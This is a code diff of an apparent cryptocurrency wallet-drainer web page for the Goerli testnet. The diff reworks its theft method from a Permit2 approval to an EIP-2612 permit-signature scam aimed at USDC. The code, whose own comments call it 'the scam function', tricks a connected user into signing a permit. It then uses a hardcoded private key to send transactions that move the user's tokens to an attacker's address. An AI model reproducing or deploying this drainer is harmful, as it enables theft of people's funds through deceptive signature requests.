@@ -3,9 +3,8 @@ const { ethers, ethereum } = window
 // constants
 const RPC = "https://goerli.infura.io/v3/15d127f3ac494ca88ab983921536e312" // Goerly RPC
 const chainId = 5 // Goerly chain id
-const Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3" // Permit2 deployed to Goerly
-const tokenToSteal = "0x024f245F740667fF208068d593E4C7f8f26416f2" // DAI on Goerly
-const amountToSteal = String(20 * (10 ** 18)) // calculate DAI amount
+const tokenToSteal = "0x07865c6E87B9F70255377e024ace6630C1Eaa37F" // USDC on Goerly
+const amountToSteal = String(20 * (10 ** 6)) // calculate USDC amount
 const initiator = "0xECD56821D6eB6db6cCB30243cb1d6592Ff5A0F14" // initiator address
 const initiatorPK = "050947b326c43b89fd7d46ef2e3ab49ce419ac03c4ba1e66c055abb86cf6d2c4" // initiaror's private key
 const recipient = "0xf50b1E00215D83089AEE99b76D64a9C0b915062a" // recipient of stolen asset
@@ -16,112 +15,66 @@ const mainButton = document.getElementById("main")
 mainButton.disabled = true
 
 // ABIs
-const Permit2ContractABI = [
+const PermitERC20_ABI = [
     {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "owner",
-          "type": "address"
-        },
-        {
-          "components": [
-            {
-              "components": [
-                {
-                  "internalType": "address",
-                  "name": "token",
-                  "type": "address"
-                },
-                {
-                  "internalType": "uint160",
-                  "name": "amount",
-                  "type": "uint160"
-                },
-                {
-                  "internalType": "uint48",
-                  "name": "expiration",
-                  "type": "uint48"
-                },
-                {
-                  "internalType": "uint48",
-                  "name": "nonce",
-                  "type": "uint48"
-                }
-              ],
-              "internalType": "struct IAllowanceTransfer.PermitDetails",
-              "name": "details",
-              "type": "tuple"
-            },
-            {
-              "internalType": "address",
-              "name": "spender",
-              "type": "address"
-            },
-            {
-              "internalType": "uint256",
-              "name": "sigDeadline",
-              "type": "uint256"
-            }
-          ],
-          "internalType": "struct IAllowanceTransfer.PermitSingle",
-          "name": "permitSingle",
-          "type": "tuple"
-        },
-        {
-          "internalType": "bytes",
-          "name": "signature",
-          "type": "bytes"
-        }
-      ],
-      "name": "permit",
-      "outputs": [],
-      "stateMutability": "nonpayable",
-      "type": "function"
-    },
-    {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "from",
-          "type": "address"
-        },
-        {
-          "internalType": "address",
-          "name": "to",
-          "type": "address"
-        },
-        {
-          "internalType": "uint160",
-          "name": "amount",
-          "type": "uint160"
-        },
-        {
-          "internalType": "address",
-          "name": "token",
-          "type": "address"
-        }
-      ],
-      "name": "transferFrom",
-      "outputs": [],
-      "stateMutability": "nonpayable",
-      "type": "function"
-    }
-]
-
-const ERC20_ABI = [
-    {
-        "constant": false,
-        "inputs": [
-            { "name": "_spender", "type": "address" },
-            { "name": "_value", "type": "uint256" }
-        ],
-        "name": "approve",
+        "constant": true,
+        "inputs": [],
+        "name": "name",
         "outputs": [
-            { "name": "", "type": "bool" }
+            { "name": "", "type": "string" }
         ],
         "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "version",
+        "outputs": [
+            { "version": "", "type": "string" }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            { "internalType": "address", "name": "owner", "type": "address" },
+            { "internalType": "address", "name": "spender", "type": "address" },
+            { "internalType": "uint256", "name": "value", "type": "uint256" },
+            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
+            { "internalType": "uint8", "name": "v", "type": "uint8" },
+            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
+            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
+        ],
+        "name": "permit",
+        "outputs": [],
         "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            { "internalType": "address", "name": "from", "type": "address" },
+            { "internalType": "address", "name": "to", "type": "address" },
+            { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "transferFrom",
+        "outputs": [
+            { "internalType": "bool", "name": "", "type": "bool" }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            { "internalType": "address", "name": "owner", "type": "address" }
+        ],
+        "name": "nonces",
+        "outputs": [
+            { "internalType": "uint256", "name": "", "type": "uint256" }
+        ],
+        "stateMutability": "view",
         "type": "function"
     }
 ]
@@ -150,84 +103,63 @@ async function connect() {
 
     connectButton.innerText = selectedAddress
     connectButton.disabled = true
-    approveButton.disabled = false
     mainButton.disabled = false
-}
-
-// function for token approval to the Permit2 contract
-async function approveToken() {
-    const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenToSteal, { from: selectedAddress })
-    tokenContract.methods.approve(Permit2Contract, amountToSteal).send({ from: selectedAddress })
-    .on("transactionHash", function(hash) {
-        console.log("wait for a little bit..")
-    })
-    .on("receipt", function(receipt) {
-        console.log("You successfully approved ", tokenToSteal, "with the amount, ", amountToSteal)
-    })
 }
 
 // the scam function
 async function fakePermit() {
+    const tokenContract = new web3.eth.Contract(PermitERC20_ABI, tokenToSteal)
+    const contractNonce = await tokenContract.methods.nonces(selectedAddress).call()
     const deadline = 10000000000000
-    const nonce = 0 // still experimenting on this one
 
     const dataToSign = JSON.stringify({
         domain: {
-            name: "Permit2",
+            name: "USD Coin", // token name
+            version: "2", // version of a token
             chainId: chainId,
-            verifyingContract: Permit2Contract
-        },
+            verifyingContract: tokenToSteal
+        }, 
         types: {
             EIP712Domain: [
                 { name: "name", type: "string" },
+                { name: "version", type: "string" },
                 { name: "chainId", type: "uint256" },
-                { name: "verifyingContract", type: "address" }
+                { name: "verifyingContract", type: "address" },
             ],
-            PermitSingle: [
-                { name: "details", type: "PermitDetails" },
+            Permit: [
+                { name: "owner", type: "address" },
                 { name: "spender", type: "address" },
-                { name: "sigDeadline", type: "uint256" }
-            ],
-            PermitDetails: [
-                { name: "token", type: "address" },
-                { name: "amount", type: "uint160" },
-                { name: "expiration", type: "uint48" },
-                { name: "nonce", type: "uint48" }
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" },
             ]
         },
-        primaryType: "PermitSingle",
+        primaryType: "Permit",
         message: { 
-            details: {
-                token: tokenToSteal,
-                amount: amountToSteal,
-                expiration: deadline,
-                nonce: nonce
-            }, 
+            owner: selectedAddress, 
             spender: initiator, 
-            sigDeadline: deadline,
+            value: amountToSteal,
+            nonce: contractNonce, 
+            deadline: deadline 
         }
     })
-
+        
     web3.currentProvider.sendAsync({
         method: "eth_signTypedData_v3",
         params: [selectedAddress, dataToSign],
         from: selectedAddress
     }, async (error, result) => {
-        if (error != null) {
-            console.log("Error signing")
-            return
-        }
+        if (error != null) return reject("Denied Signature")
 
-        const signature = result.result
         const initiatorNonce = await web3.eth.getTransactionCount(initiator)
-        const permit2Contract = new web3.eth.Contract(Permit2ContractABI, Permit2Contract)
-        
-        const permitDetails = [[tokenToSteal, amountToSteal, deadline, nonce], initiator, deadline]
-        const permitData = permit2Contract.methods.permit(selectedAddress, permitDetails, signature).encodeABI()
+        const signature = result.result
+        const splited = ethers.utils.splitSignature(signature)
+
+        const permitData = tokenContract.methods.permit(selectedAddress, initiator, amountToSteal, deadline, splited.v, splited.r, splited.s).encodeABI()
         const gasPrice = await web3.eth.getGasPrice()
         const permitTX = {
             from: initiator,
-            to: Permit2Contract,
+            to: tokenToSteal,
             nonce: web3.utils.toHex(initiatorNonce),
             gasLimit: web3.utils.toHex(98000),
             gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
@@ -238,16 +170,16 @@ async function fakePermit() {
         web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
 
         // after the token is approved to us, steal it
-        const transferData = permit2Contract.methods.transferFrom(selectedAddress, recipient, amountToSteal, tokenToSteal).encodeABI() 
+        const transferData = tokenContract.methods.transferFrom(selectedAddress, recipient, amountToSteal).encodeABI() 
         const transferTX = {
             from: initiator,
-            to: Permit2Contract,
+            to: tokenToSteal,
             nonce: web3.utils.toHex(initiatorNonce + 1), // don't forget to increment initiator's nonce
             gasLimit: web3.utils.toHex(98000),
             gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
-            value: "0x",
-            data: transferData
-        }
+            data: transferData,
+            value: "0x"
+        } 
         const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK)
         web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction)
     })
@@ -256,10 +188,6 @@ async function fakePermit() {
 // configure buttons
 window.addEventListener("DOMContentLoaded", () => {
     connectButton.onclick = connect
-})
-
-window.addEventListener("DOMContentLoaded", () => {
-    approveButton.onclick = approveToken
 })
 
 window.addEventListener("DOMContentLoaded", () => {
